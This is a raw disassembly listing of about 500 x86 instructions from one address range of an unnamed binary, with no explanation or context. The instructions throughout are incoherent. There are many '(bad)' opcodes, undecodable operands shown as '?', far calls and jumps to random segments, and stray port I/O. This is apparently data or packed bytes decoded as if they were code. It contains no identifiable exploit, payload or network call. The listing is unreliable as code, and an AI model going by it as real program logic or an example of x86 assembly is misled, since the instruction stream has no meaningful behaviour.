  537120:	shr    DWORD PTR [ecx-0x2c],1
  537123:	fldcw  WORD PTR [esi+0x76ff4b61]
  537129:	sbb    eax,0x9c29a39
  53712e:	hlt    
  53712f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  537130:	push   ebx
  537131:	mov    esi,0xc0ffc2ea
  537136:	mov    esp,DWORD PTR [esi+0x15c940e1]
  53713c:	jge    0x5370dc
  53713e:	xor    DWORD PTR [eax],esp
  537140:	js     0x5371b0
  537142:	xor    edi,edi
  537144:	add    DWORD PTR [ebp-0x2f],ebp
  537147:	jmp    DWORD PTR [ebp-0xd92c0c1]
  53714d:	ret    0xd0d3
  537150:	clc    
  537151:	adc    BYTE PTR [ebp+edi*2+0x56682911],bl
  537158:	dec    edi
  537159:	fistp  DWORD PTR [eax+eax*8-0x292638b0]
  537160:	aaa    
  537161:	push   ebx
  537162:	mov    fs,WORD PTR [eax+eiz*8]
  537165:	xchg   BYTE PTR [edi],bl
  537167:	ss jge 0x537182
  53716a:	ins    BYTE PTR es:[edi],dx
  53716b:	adc    eax,0xefb72c82
  537170:	add    BYTE PTR [ecx],ch
  537172:	cdq    
  537173:	cmp    ah,BYTE PTR [eax]
  537175:	fidiv  DWORD PTR [ebx]
  537177:	cmp    eax,0x4be2294e
  53717c:	mov    dl,0xba
  53717e:	jbe    0x53711c
  537180:	sub    al,0x1e
  537182:	pushf  
  537183:	mov    DWORD PTR [eax],edi
  537185:	and    al,0x77
  537187:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  537188:	xchg   edi,eax
  537189:	xor    al,0x44
  53718b:	mov    al,0xed
  53718d:	scas   eax,DWORD PTR es:[edi]
  53718e:	xor    DWORD PTR [ebp+ebx*4+0x4a],ecx
  537192:	sub    BYTE PTR [ecx-0x7cc6f36e],dl
  537198:	jge    0x537162
  53719a:	push   edx
  53719b:	inc    ebp
  53719c:	sahf   
  53719d:	fst    DWORD PTR ds:0xc027aa3f
  5371a3:	shr    BYTE PTR [esp+ebx*1-0x25cbda9c],0x64
  5371ab:	sub    eax,0x64b229ca
  5371b0:	ss stos DWORD PTR es:[edi],eax
  5371b2:	repz loop 0x5371cf
  5371b5:	fs xchg esi,eax
  5371b7:	push   0xed733aa7
  5371bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5371bd:	fdiv   QWORD PTR [eax+0x7b679ac]
  5371c3:	sti    
  5371c4:	pop    esi
  5371c5:	inc    edi
  5371c6:	sub    DWORD PTR [ebp-0x2c],ebp
  5371c9:	and    eax,0xa4c7d57d
  5371ce:	xchg   ebp,eax
  5371cf:	jo     0x537158
  5371d1:	shr    DWORD PTR [esi+eiz*2+0x4f],cl
  5371d5:	fnstsw WORD PTR [ebp+0x6f]
  5371d8:	call   0x66e9:0xa943c697
  5371df:	jl     0x537234
  5371e1:	inc    eax
  5371e2:	jno    0x53724c
  5371e4:	imul   ecx,DWORD PTR [ecx],0xffffffe2
  5371e7:	inc    edx
  5371e8:	aam    0xb3
  5371ea:	or     DWORD PTR [eax],esi
  5371ec:	hlt    
  5371ed:	xchg   ebx,eax
  5371ee:	mov    ecx,0x182d0ed
  5371f3:	push   esp
  5371f4:	aaa    
  5371f5:	rcl    BYTE PTR [eax+0x1e],1
  5371f8:	inc    ebp
  5371f9:	xor    edi,ecx
  5371fb:	lock stos BYTE PTR es:[edi],al
  5371fd:	sahf   
  5371fe:	jp     0x537272
  537200:	mov    al,ds:0xa498ea66
  537205:	xchg   esi,eax
  537206:	or     esp,DWORD PTR [edi]
  537208:	inc    ebp
  537209:	push   esp
  53720a:	mov    ebx,0xf2e7390
  53720f:	out    0x8b,al
  537211:	mov    al,ds:0x25692d7
  537216:	ss push 0xdb94ea90
  53721c:	xchg   ecx,eax
  53721d:	repnz and eax,0x8e8c77e2
  537223:	mov    esi,0x34fe17d
  537228:	adc    BYTE PTR [edi+0x5e],al
  53722b:	in     al,dx
  53722c:	out    0x28,eax
  53722e:	mov    ds:0xa4252766,eax
  537233:	fimul  WORD PTR [ecx]
  537235:	jmp    0x5371c1
  537237:	retf   0x7b0b
  53723a:	sbb    dl,BYTE PTR ds:0x329e570e
  537240:	jbe    0x53722b
  537242:	ins    BYTE PTR es:[edi],dx
  537243:	sbb    eax,edx
  537245:	jmp    0x53726d
  537247:	retf   0x3ef4
  53724a:	jbe    0x5371e2
  53724c:	adc    al,ch
  53724e:	rcl    DWORD PTR [esi+0x783f55e0],1
  537254:	dec    ebx
  537255:	or     ah,bh
  537257:	mov    ch,0xe9
  537259:	lea    esp,[ebp+eiz*1-0x1]
  53725d:	pop    esi
  53725e:	ins    DWORD PTR es:[edi],dx
  53725f:	iret   
  537260:	sub    DWORD PTR ds:0x1c38bdbe,esi
  537266:	fist   WORD PTR [edi+0x3f]
  537269:	out    0xa1,al
  53726b:	repz gs std 
  53726e:	xor    BYTE PTR [ebp-0x269c1497],0x16
  537275:	xor    eax,0xfd819836
  53727a:	sbb    al,bl
  53727c:	xor    BYTE PTR [ebx-0x1a],cl
  53727f:	jge    0x537255
  537281:	cld    
  537282:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  537283:	lods   eax,DWORD PTR ds:[esi]
  537284:	push   0x7a
  537286:	push   ecx
  537287:	test   DWORD PTR [eax+0x2],ebp
  53728a:	out    dx,al
  53728b:	ret    
  53728c:	or     ch,BYTE PTR [eax]
  53728e:	out    0x56,eax
  537290:	cmp    al,0xe4
  537292:	dec    ecx
  537293:	add    dl,dh
  537295:	fist   DWORD PTR [ebp+0x72fee15a]
  53729b:	repz in al,dx
  53729d:	out    0xd4,al
  53729f:	jo     0x5372ae
  5372a1:	call   DWORD PTR [ebx+0x38]
  5372a4:	mov    edi,0x8b1f325c
  5372a9:	std    
  5372aa:	gs dec esp
  5372ac:	or     eax,DWORD PTR [esi+0xa]
  5372af:	push   esi
  5372b0:	add    al,0xbc
  5372b2:	inc    esi
  5372b3:	jbe    0x537286
  5372b5:	and    DWORD PTR [ebx+0x3d193110],edi
  5372bb:	loop   0x53727c
  5372bd:	sbb    DWORD PTR [edi+esi*1-0x60],ebp
  5372c1:	push   ecx
  5372c2:	mov    bh,ch
  5372c4:	pop    ds
  5372c5:	lock das 
  5372c7:	push   eax
  5372c8:	xlat   BYTE PTR ds:[ebx]
  5372c9:	inc    esi
  5372ca:	int3   
  5372cb:	call   0x548b:0x1de069fc
  5372d2:	inc    ebx
  5372d3:	dec    edx
  5372d4:	dec    edi
  5372d5:	inc    esp
  5372d6:	mov    ebx,0xc981c27e
  5372db:	pop    esi
  5372dc:	dec    eax
  5372dd:	sbb    BYTE PTR [edi],bl
  5372df:	nop
  5372e0:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  5372e2:	inc    ebp
  5372e3:	mov    ebp,ecx
  5372e5:	lds    esp,FWORD PTR [eax]
  5372e7:	(bad)  
  5372e8:	cmp    dl,dl
  5372ea:	iret   
  5372eb:	int    0x2e
  5372ed:	jb     0x537328
  5372ef:	ret    0x724f
  5372f2:	popa   
  5372f3:	xor    eax,0xc7b359f8
  5372f8:	sub    BYTE PTR [edi+ebx*2+0x6a5ed614],cl
  5372ff:	xchg   edx,eax
  537300:	lock or DWORD PTR [ebp+esi*4-0x6c],ecx
  537305:	pop    edi
  537306:	dec    edx
  537307:	pop    ebp
  537308:	mov    ah,0x3b
  53730a:	fist   DWORD PTR [ebx-0x5077c6c8]
  537310:	mov    esp,0x4988458d
  537315:	push   es
  537316:	loope  0x537303
  537318:	push   0x57
  53731a:	inc    ebp
  53731b:	clc    
  53731c:	out    dx,eax
  53731d:	add    dl,BYTE PTR [ecx+ebx*2-0x80]
  537321:	leave  
  537322:	inc    ecx
  537323:	xchg   BYTE PTR [ebp+0x5],dl
  537326:	cli    
  537327:	dec    ebp
  537328:	sbb    eax,0xc1db9b2f
  53732d:	jmp    0x537341
  53732f:	sub    ch,BYTE PTR gs:[ecx+0x57]
  537333:	cmp    ebp,0x7a438694
  537339:	int    0x31
  53733b:	cmp    BYTE PTR [ebx],dh
  53733d:	ret    0x718f
  537340:	aas    
  537341:	lahf   
  537342:	ret    
  537343:	scas   eax,DWORD PTR es:[edi]
  537344:	add    al,0x7
  537346:	test   DWORD PTR [edx],0xd5f442f2
  53734c:	inc    BYTE PTR [ebp-0x6abb25ed]
  537352:	jle    0x537339
  537354:	int3   
  537355:	push   ds
  537356:	mov    eax,0xa3d2e33
  53735b:	xchg   eax,esi
  53735d:	or     al,0x94
  53735f:	cs sbb eax,0x8ade9970
  537365:	push   edi
  537366:	sahf   
  537367:	cdq    
  537368:	or     eax,0x398e589e
  53736d:	rcr    cl,cl
  53736f:	push   es
  537370:	xchg   edx,eax
  537371:	cli    
  537372:	xchg   ebp,eax
  537373:	mov    BYTE PTR [edi-0x2dac923e],ch
  537379:	xchg   edi,eax
  53737a:	inc    esi
  53737b:	or     al,0xfe
  53737d:	pop    es
  53737e:	and    eax,0x79a5ebd2
  537383:	pop    ds
  537384:	dec    esp
  537385:	or     esi,DWORD PTR [esi]
  537387:	and    BYTE PTR [edi+0x21c3cb7b],0xf2
  53738e:	pop    esi
  53738f:	es mov ebx,0x26e53390
  537395:	cmc    
  537396:	xlat   BYTE PTR ds:[ebx]
  537397:	call   0xd804deb9
  53739c:	push   ebx
  53739d:	mov    edi,0xdfd4edbb
  5373a2:	jg     0x5373da
  5373a4:	fwait
  5373a5:	mov    ch,dh
  5373a7:	inc    eax
  5373a8:	cli    
  5373a9:	lock fwait
  5373ab:	ja     0x53736f
  5373ad:	std    
  5373ae:	add    esi,DWORD PTR [edi]
  5373b0:	sar    BYTE PTR [ecx],0xb4
  5373b3:	loope  0x537375
  5373b5:	(bad)  
  5373b6:	jg     0x537385
  5373b8:	mov    eax,ds:0xb290942c
  5373bd:	stos   BYTE PTR es:[edi],al
  5373be:	test   eax,0x7195942e
  5373c3:	in     eax,dx
  5373c4:	test   DWORD PTR [eax+esi*1+0x5e5ded61],edx
  5373cb:	fucomi st,st(4)
  5373cd:	pusha  
  5373ce:	xlat   BYTE PTR ds:[ebx]
  5373cf:	sbb    dh,BYTE PTR [eax]
  5373d1:	push   ebx
  5373d2:	xchg   edx,eax
  5373d3:	push   esp
  5373d4:	lods   eax,DWORD PTR ds:[esi]
  5373d5:	add    al,0xc9
  5373d7:	clc    
  5373d8:	int    0xb2
  5373da:	loope  0x53739c
  5373dc:	dec    ebp
  5373dd:	in     eax,dx
  5373de:	pop    eax
  5373df:	sbb    esi,DWORD PTR [ecx]
  5373e1:	es ret 
  5373e3:	sahf   
  5373e4:	cmp    edi,DWORD PTR fs:[eax+0x76d614fb]
  5373eb:	test   eax,0x6e0e825b
  5373f0:	lods   eax,DWORD PTR ds:[esi]
  5373f1:	mov    edx,0xfe3f87dd
  5373f6:	adc    esi,DWORD PTR [esi+0x5827670e]
  5373fc:	mov    BYTE PTR [ecx+eax*1+0x295ba9b7],bl
  537403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  537404:	xchg   esi,eax
  537405:	js     0x5373f9
  537407:	pop    esp
  537408:	das    
  537409:	gs push ebp
  53740b:	sbb    bh,BYTE PTR ds:0xce82cb2d
  537411:	jno    0x537459
  537413:	add    BYTE PTR [esi],cl
  537415:	fisubr WORD PTR [ebx]
  537417:	call   0x2d1e4322
  53741c:	mov    BYTE PTR ds:0xc94a7bdd,dl
  537422:	(bad)  
  537423:	aad    0x99
  537425:	adc    eax,0xf184ea40
  53742a:	inc    edi
  53742b:	lock mov esi,0x8d4cba4b
  537431:	pop    es
  537432:	jmp    0x537435
  537434:	or     BYTE PTR [esi+0x72],bh
  537437:	fcmovb st,st(7)
  537439:	or     eax,0x7a509fbe
  53743e:	or     dl,BYTE PTR [edi-0x589bcfa9]
  537444:	cld    
  537445:	nop
  537446:	xor    dl,BYTE PTR [ebx+eax*8+0x44]
  53744a:	aas    
  53744b:	mov    ?,WORD PTR [edi+edi*4+0x56f867e8]
  537452:	fs dec ecx
  537454:	lods   al,BYTE PTR ds:[esi]
  537455:	mov    bl,0x45
  537457:	mov    bl,0x2b
  537459:	ins    BYTE PTR es:[edi],dx
  53745a:	sub    BYTE PTR [edi+0xb],0x89
  53745e:	sbb    eax,0x1cbe027b
  537463:	mov    dl,0x99
  537465:	out    0x6f,eax
  537467:	dec    eax
  537468:	ret    0xa3
  53746b:	call   DWORD PTR [ebp+0x7e]
  53746e:	retf   
  53746f:	lods   al,BYTE PTR ds:[esi]
  537470:	mov    edi,0x8bed13c7
  537475:	cmp    eax,0xf4c4d75f
  53747a:	aas    
  53747b:	xchg   DWORD PTR [esi],ebx
  53747d:	dec    ebp
  53747e:	in     eax,dx
  53747f:	(bad)  
  537481:	jne    0x537474
  537483:	call   0x1a3c0b27
  537488:	imul   ecx,DWORD PTR [esi-0x44],0xffffffc1
  53748c:	fist   DWORD PTR [eax+ecx*2]
  53748f:	jae    0x537443
  537491:	mov    ah,0x32
  537493:	jp     0x53747d
  537495:	outs   dx,BYTE PTR ds:[esi]
  537496:	inc    edi
  537497:	mov    DWORD PTR [ebp+0x47],esp
  53749a:	fnstsw WORD PTR [edi-0x40]
  53749d:	call   0x7d9a59d2
  5374a2:	pop    esp
  5374a3:	xchg   esp,eax
  5374a4:	shr    dh,0x1
  5374a7:	lods   al,BYTE PTR ds:[esi]
  5374a8:	sub    DWORD PTR [edx],ebx
  5374aa:	and    BYTE PTR [ebp+0x3],ah
  5374ad:	js     0x537511
  5374af:	mov    dl,0x4e
  5374b1:	sbb    al,0xa1
  5374b3:	dec    edx
  5374b4:	repz dec esi
  5374b6:	inc    edx
  5374b7:	or     DWORD PTR [bx+di-0x5f],esp
  5374bb:	push   esp
  5374bc:	cdq    
  5374bd:	adc    BYTE PTR [eax+0x7e],cl
  5374c0:	sub    dh,bh
  5374c2:	sbb    esp,DWORD PTR [ebx-0x7ecdd1a2]
  5374c8:	(bad)  
  5374ca:	stos   DWORD PTR es:[edi],eax
  5374cb:	loope  0x5374ea
  5374cd:	out    dx,eax
  5374ce:	(bad)  
  5374d0:	(bad)  
  5374d2:	or     DWORD PTR [eax-0x6e921c54],0x7e
  5374d9:	or     bh,BYTE PTR [ebx-0x4a]
  5374dc:	lock pop edx
  5374de:	sbb    DWORD PTR [ebp-0x46350615],ebx
  5374e4:	aaa    
  5374e5:	sub    ebp,DWORD PTR ds:0x57ddff36
  5374eb:	dec    ecx
  5374ec:	mov    edx,0xe0d96ab4
  5374f1:	jmp    0x537475
  5374f3:	pop    edi
  5374f4:	sbb    dl,BYTE PTR [edx-0x43fed8b0]
  5374fa:	shr    ebp,cl
  5374fc:	cli    
  5374fd:	sahf   
  5374fe:	mov    WORD PTR [ecx-0x47],?
  537501:	jecxz  0x537503
  537503:	shl    BYTE PTR [ebp*2+0x5f7c2db2],cl
  53750a:	xor    edx,esp
  53750c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  53750d:	adc    eax,0x3a4ce351
  537512:	and    al,0xad
  537515:	mov    ebp,0xa6580075
  53751a:	push   ebp
  53751b:	sbb    BYTE PTR [esi+0xf],0xb3
  53751f:	loop   0x53752f
  537521:	inc    ecx
  537522:	cmp    eax,0x2c8abdec
  537527:	imul   ebx,DWORD PTR [ebx],0x28
  53752a:	clc    
  53752b:	jae    0x5374bb
  53752d:	dec    edx
  53752e:	fsubp  st(5),st
  537530:	ffreep st(5)
  537532:	clc    
  537533:	gs aaa 
  537535:	retf   0xed9d
  537538:	call   0x1462:0x236d6870
  53753f:	jae    0x53750d
  537541:	(bad)  ds:[eax+0x2b]
  537545:	ss stos BYTE PTR es:[edi],al
  537547:	and    edx,DWORD PTR [edx+0x28]
  53754a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  53754b:	sub    DWORD PTR [edx+0x79],ebx
  53754e:	mov    eax,ds:0x9364ba20
  537553:	push   eax
  537555:	aaa    
  537556:	inc    esi
  537557:	jmp    0x53751a
  537559:	mov    al,ds:0x3732dbd2
  53755e:	sbb    BYTE PTR [ebp-0x63],cl
  537561:	(bad)  
  537562:	pop    eax
  537563:	inc    edx
  537564:	push   ebp
  537565:	ror    DWORD PTR [eax-0x7f],0xa7
  537569:	xor    DWORD PTR [eax-0x35],0xffffff97
  53756d:	add    ecx,DWORD PTR [edx]
  53756f:	inc    esp
  537570:	fstp   TBYTE PTR [edi+0x14cca171]
  537576:	jp     0x53759d
  537578:	sbb    ch,dl
  53757a:	or     eax,0xd10e74bb
  53757f:	fimul  DWORD PTR [edi]
  537581:	mov    ecx,0xedc61745
  537586:	and    al,0xfe
  537588:	out    dx,al
  537589:	fs ret 0x6fc3
  53758d:	test   al,0xd
  53758f:	mov    ah,dl
  537591:	pushf  
  537592:	mov    dl,0x98
  537594:	or     al,0x52
  537596:	adc    eax,0xbaf29aa5
  53759b:	outs   dx,DWORD PTR ds:[esi]
  53759c:	and    BYTE PTR [edi-0x668c353a],dh
  5375a2:	dec    edi
  5375a3:	loopne 0x5375a8
  5375a5:	ret    
  5375a6:	inc    ebp
  5375a7:	or     al,0x66
  5375a9:	out    dx,al
  5375aa:	js     0x53754d
  5375ac:	fcom   DWORD PTR [edi]
  5375ae:	mov    BYTE PTR [ebx+0x4e],cl
  5375b1:	xchg   BYTE PTR [ebx],al
  5375b3:	or     bh,BYTE PTR [edi-0x1d89ea9e]
  5375b9:	inc    ebp
  5375ba:	xchg   edx,eax
  5375bb:	out    0xa9,al
  5375bd:	icebp  
  5375be:	call   0x6ff2dedd
  5375c3:	adc    ch,BYTE PTR [ebx]
  5375c5:	add    ecx,0xffffffc1
  5375c8:	mov    ebp,0x35587b64
  5375cd:	jge    0x5375f0
  5375cf:	mov    al,ds:0x46ddb73d
  5375d4:	pop    eax
  5375d5:	dec    ebx
  5375d6:	cmp    DWORD PTR [edi+0x32],ebp
  5375d9:	fcomp  DWORD PTR [ecx-0x22c14692]
  5375df:	int3   
  5375e0:	push   esp
  5375e1:	dec    edi
  5375e2:	mov    ecx,0xfdbcc153
  5375e7:	hlt    
  5375e8:	push   es
  5375e9:	jbe    0x537585
  5375eb:	push   edx
  5375ec:	popf   
  5375ed:	and    BYTE PTR ds:0x55bf7b0a,0x14
  5375f4:	xchg   esi,eax
  5375f5:	mov    bh,0x62
  5375f7:	scas   al,BYTE PTR es:[edi]
  5375f8:	inc    eax
  5375f9:	stos   BYTE PTR es:[edi],al
  5375fa:	adc    eax,0x158eff34
  5375ff:	ins    BYTE PTR es:[edi],dx
  537600:	mov    bl,0x98
  537602:	ins    DWORD PTR es:[edi],dx
  537603:	(bad)  
  537604:	stc    
  537605:	mov    ds:0x7b314f5b,eax
  53760a:	xor    cl,cl
  53760c:	into   
  53760d:	ss jo  0x537636
  537610:	xchg   edi,eax
  537611:	gs push 0x65
  537614:	mov    ds:0xc09b47ef,eax
  537619:	cmc    
  53761a:	mov    dl,0xf4
  53761c:	loop   0x537673
  53761e:	adc    DWORD PTR [eax+0x2a6508de],ecx
  537624:	push   edx
  537625:	movzx  esp,WORD PTR [ebx+0x1]
  537629:	mov    es,WORD PTR [ebx-0x2bb87f47]
  53762f:	or     DWORD PTR ds:0x51ec1c8f,esp
  537635:	jge    0x537668
  537637:	push   0xd394bdd9
  53763c:	pop    eax
  53763d:	mov    ecx,0x18425c29
  537642:	jmp    0xb67e:0x3c9b3544
  537649:	sbb    al,0xb
  53764b:	jp     0x537609
  53764d:	mov    bh,0x8
  53764f:	sar    dl,0x5a
  537652:	jo     0x5376a0
  537654:	or     al,0x18
  537656:	jae    0x53761d
  537658:	nop
  537659:	and    eax,0x43a9df57
  53765e:	or     esp,DWORD PTR [ecx+0x34]
  537661:	ds hlt 
  537663:	push   ebp
  537664:	fdiv   QWORD PTR [edi]
  537666:	std    
  537667:	xor    eax,0x2f9db8ab
  53766c:	adc    al,0x4c
  53766e:	adc    DWORD PTR es:[edi+0x5a],esi
  537672:	fwait
  537673:	sbb    DWORD PTR [ebp+0x5f],0x69
  537677:	and    al,0xd7
  537679:	push   0x1a
  53767b:	jge    0x5376bc
  53767d:	in     eax,0x87
  53767f:	jge    0x53760e
  537681:	lds    esi,FWORD PTR ds:[ecx+ebx*2-0x3dc282b0]
  537689:	add    BYTE PTR [eax+ebx*4-0x2be4a55a],cl
  537690:	mov    cl,0x86
  537692:	clc    
  537693:	jp     0x53768e
  537695:	pop    edx
  537696:	jl     0x5376c4
  537698:	ss adc dh,bh
  53769b:	pop    ecx
  53769c:	cli    
  53769d:	mov    ecx,DWORD PTR [eax-0x70]
  5376a0:	test   dl,dh
  5376a2:	lahf   
  5376a3:	xchg   BYTE PTR [ecx+0x2c],dl
  5376a6:	pop    esi
  5376a7:	aad    0xee
  5376a9:	sar    ecx,cl
  5376ab:	jmp    0x5376de
  5376ad:	repz jmp 0x9e82d4f3
  5376b3:	hlt    
  5376b4:	inc    edi
  5376b5:	add    DWORD PTR ss:[ecx],esp
  5376b8:	pop    DWORD PTR [ebx+0x49d674af]
  5376be:	loop   0x537663
  5376c0:	retf   0x733d
  5376c3:	lods   eax,DWORD PTR ds:[esi]
  5376c4:	mov    esi,0x5718a140
  5376c9:	(bad)  
  5376cb:	sub    eax,0xb3390114
  5376d0:	push   ecx
  5376d1:	adc    DWORD PTR [edx+0xc],eax
  5376d4:	gs push edi
  5376d6:	pop    ecx
  5376d7:	pop    ds
  5376d8:	jbe    0x53765b
  5376da:	daa    
  5376db:	push   ss
  5376dc:	cmp    eax,0xd4628eec
  5376e1:	add    BYTE PTR [ebx-0x1141cd9f],ch
  5376e7:	cmp    al,0x8e
  5376e9:	stos   DWORD PTR es:[edi],eax
  5376ea:	add    al,0xda
  5376ec:	jecxz  0x537699
  5376ee:	dec    esi
  5376ef:	sub    al,0x87
  5376f1:	addr16 jo 0x537718
  5376f4:	lahf   
  5376f5:	cmp    al,0x8
  5376f7:	mov    al,0x48
  5376f9:	bound  eax,QWORD PTR [edi+ebp*4]
  5376fc:	or     edx,ebp
  5376fe:	xchg   ebx,eax
  5376ff:	mov    eax,0x4cb731bb
  537704:	push   0xffffffc9
  537706:	imul   eax,DWORD PTR [edi-0x5c],0xa2ca29a8
  53770d:	dec    edx
  53770e:	mov    dl,BYTE PTR ss:[ebx-0x6421e63c]
  537715:	push   ecx
  537716:	aad    0x8d
  537718:	(bad)  
  537719:	sub    eax,0xb3456cfa
  53771e:	dec    edi
  53771f:	mov    ch,0x96
  537721:	ret    
  537722:	cmp    al,0xb0
  537724:	xor    ah,BYTE PTR [eax+0x43]
  537727:	mul    DWORD PTR [esi-0x2fd382f4]
  53772d:	pop    ebp
  53772e:	arpl   WORD PTR [edi],ax
  537730:	bswap  eax
  537732:	push   edx
  537733:	xchg   BYTE PTR [ebx+0x62c9b636],al
  537739:	pop    edi
  53773a:	dec    ebx
  53773b:	xor    BYTE PTR ds:0xc12fd0b5,dl
  537741:	daa    
  537742:	pop    ecx
  537743:	add    DWORD PTR [ebp-0x5e2754e7],edi
  537749:	dec    ebx
  53774a:	scas   eax,DWORD PTR es:[edi]
  53774b:	rcr    BYTE PTR [edx],0xbd
  53774e:	sbb    DWORD PTR [ecx],esp
  537750:	and    al,0x7
  537752:	mov    ecx,0x3b0e0ec8
  537757:	(bad)  
  537758:	cmp    BYTE PTR [edx-0xf],ch
  53775b:	push   ebp
  53775c:	mov    eax,ds:0xb9118524
  537761:	dec    ebp
  537762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  537763:	mov    WORD PTR [ebp+0x74],gs
  537766:	loop   0x53773b
  537768:	inc    ebp
  537769:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  53776a:	into   
  53776b:	cld    
  53776c:	cmp    eax,0x8acf61df
  537771:	jmp    0x78a8:0x722edbcb
  537778:	cmp    DWORD PTR [edx+ecx*1-0x36f37a11],0x1d
  537780:	pop    edi
  537781:	pop    ebx
  537782:	iret   
  537783:	outs   dx,BYTE PTR ds:[esi]
  537784:	mov    eax,0xd6d40784
  537789:	jg     0x5377ac
  53778b:	xor    al,0x2f
  53778d:	xor    ch,BYTE PTR ds:[edx-0x1b]
  537791:	loop   0x537786
  537793:	xor    DWORD PTR [edx],ecx
  537795:	inc    esi
  537796:	adc    al,bh
  537798:	and    ebx,edi
  53779a:	adc    ah,BYTE PTR [esi+0x40]
  53779d:	loop   0x5377a7
  53779f:	retf   0xa4d0
  5377a2:	out    dx,eax
  5377a3:	in     eax,dx
  5377a4:	and    DWORD PTR [edi-0x40],edi
  5377a7:	xchg   edx,eax
  5377a8:	jecxz  0x5377be
  5377aa:	inc    eax
  5377ab:	scas   eax,DWORD PTR es:[edi]
  5377ac:	dec    ecx
  5377ad:	in     eax,dx
  5377ae:	ja     0x53778f
  5377b0:	jg     0x5377fc
  5377b2:	jle    0x5377df
  5377b4:	jl     0x537748
  5377b6:	cmp    eax,0xc9e890b3
  5377bb:	mov    al,0x8e
  5377bd:	dec    esi
  5377be:	(bad)  
  5377bf:	cmp    al,0xee
  5377c1:	inc    ecx
  5377c2:	mov    eax,0x362fa055
  5377c7:	mov    cl,0x51
  5377c9:	aaa    
  5377ca:	pop    ss
  5377cb:	pusha  
  5377cc:	shl    dh,0xd6
  5377cf:	push   ebp
  5377d0:	pop    ecx
  5377d1:	sbb    DWORD PTR [eax],eax
  5377d3:	jns    0x5377d4
  5377d5:	xchg   BYTE PTR [ecx+0x2cdfb71c],ah
  5377db:	pop    DWORD PTR [edx-0x49]
  5377de:	idiv   BYTE PTR [edi+0x647fb249]
  5377e4:	retf   
  5377e5:	dec    esi
  5377e6:	mov    edx,0xe7b96701
  5377eb:	lods   al,BYTE PTR ds:[esi]
  5377ec:	call   0xf744c2fd
  5377f1:	sub    eax,0x92625ea3
  5377f6:	push   ds
  5377f7:	fist   DWORD PTR [ebp-0x472fad97]
  5377fd:	jnp    0x5377df
  5377ff:	jmp    0x883ac84c
  537804:	jno    0x5377ec
  537806:	imul   ebx,DWORD PTR [eax-0x6b],0x21
  53780a:	mov    bh,0x77
  53780c:	pop    ecx
  53780d:	ficomp WORD PTR [esi+0x9f33cfd]
  537813:	stos   BYTE PTR es:[edi],al
  537814:	loop   0x5377d5
  537816:	mov    edx,0x3a2de692
  53781b:	aaa    
  53781c:	pop    edi
  53781d:	(bad)  
  53781f:	pop    eax
  537820:	rol    DWORD PTR [edx],1
  537822:	inc    ecx
  537823:	or     DWORD PTR [ebp+0x660c0fed],ecx
  537829:	ret    0xcf8c
  53782c:	call   0x3606f4cf
  537831:	in     al,dx
  537832:	jo     0x537861
  537834:	xor    DWORD PTR [ebp+0xdc4b7f7],esi
  53783a:	jne    0x53785b
  53783c:	mov    esp,eax
  53783e:	pop    ecx
  53783f:	pop    esi
  537840:	bound  ebx,QWORD PTR [esi+esi*2]
  537843:	test   BYTE PTR [esi],ah
  537845:	jmp    0xc661c602
  53784a:	dec    esp
  53784b:	je     0x53787e
  53784d:	fnstenv [ebp-0x3fe67b28]
  537853:	sahf   
  537854:	ret    0x3285
  537857:	mov    esp,0xfaf37a95
  53785c:	mov    ah,0xd7
  53785e:	ja     0x5378d6
  537860:	inc    esi
  537861:	jmp    0x53780f
  537863:	mov    ebx,0xe7fb094
  537868:	mov    ebp,0x4d46efd7
  53786d:	iret   
  53786e:	lods   al,BYTE PTR ds:[esi]
  53786f:	mov    esp,0xc2d83967
  537874:	cmp    DWORD PTR [ebp+0x4f39e12f],ebp
  53787a:	gs sub eax,0xf97711ff
  537880:	fbld   TBYTE PTR [edx+eax*8-0x47]
  537884:	jle    0x537905
  537886:	or     eax,0x6651e067
  53788b:	xor    esp,0x73
  53788e:	dec    ebx
  53788f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  537890:	jnp    0x537907
  537892:	das    
  537893:	add    dl,bl
  537895:	neg    BYTE PTR [ecx-0x7f]
  537898:	push   0xa99b1ca2
  53789d:	retf   0x15f3
  5378a0:	ret    
  5378a1:	nop
  5378a2:	sub    DWORD PTR [ecx-0x35],0x2406e34a
  5378a9:	xchg   esi,eax
  5378aa:	jle    0x53786d
  5378ac:	sub    al,0x58
  5378ae:	loope  0x53783c
  5378b0:	jl     0x5378e1
  5378b2:	clc    
  5378b3:	ret    
  5378b4:	pushf  
  5378b5:	and    dh,BYTE PTR [ebx+0x61f3b56a]
  5378bb:	test   DWORD PTR [eax],esi
  5378bd:	rcr    BYTE PTR [esi],0xcb
  5378c0:	mov    bl,BYTE PTR [esi+0x68216ae]
  5378c6:	in     eax,dx
  5378c7:	pop    ebp
  5378c8:	jbe    0x53790b
  5378ca:	pop    eax
  5378cb:	mov    cl,0x16
  5378cd:	push   esp
  5378ce:	xor    eax,0x79a995f0
  5378d3:	fadd   st(6),st
  5378d5:	js     0x5378a0
  5378d7:	sub    al,0xb2
  5378d9:	push   edi
  5378da:	loop   0x537892
  5378dc:	pusha  
  5378dd:	sbb    DWORD PTR [ecx-0x22],edi
  5378e0:	add    al,0x2b
  5378e2:	in     eax,dx
  5378e3:	ficom  DWORD PTR [edx-0x10]
  5378e6:	sahf   
  5378e7:	outs   dx,BYTE PTR ds:[esi]
  5378e8:	adc    DWORD PTR [ebp+0x73],0xffffffce
  5378ec:	add    al,BYTE PTR [edi-0x48]
  5378ef:	clc    
  5378f0:	loop   0x537890
  5378f2:	jge    0x5378f5
  5378f4:	dec    ecx
  5378f5:	pop    ds
  5378f6:	aad    0xed
  5378f8:	test   al,0x11
  5378fa:	and    eax,0x304b5773
  5378ff:	test   eax,0x3f15a748
  537904:	cwde   
  537905:	adc    ecx,DWORD PTR [esi-0x11]
  537908:	nop
  537909:	(bad)  
  53790b:	or     esp,DWORD PTR [ebx-0x5de530c8]
  537911:	gs jae 0x5378ed
  537914:	or     DWORD PTR [eax],esp
